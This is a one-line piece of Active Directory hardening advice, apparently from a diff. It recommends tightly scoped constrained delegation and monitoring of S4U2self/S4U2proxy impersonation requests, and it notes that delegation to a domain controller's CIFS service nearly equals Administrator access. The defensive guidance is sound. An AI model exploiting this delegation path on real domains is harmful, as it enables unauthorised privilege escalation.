+- **Scope constrained delegation as tightly as possible, and monitor for S4U2self/S4U2proxy requests that impersonate high-privilege accounts.** An account with delegation to a domain controller's CIFS service is functionally one Kerberos request away from Administrator.
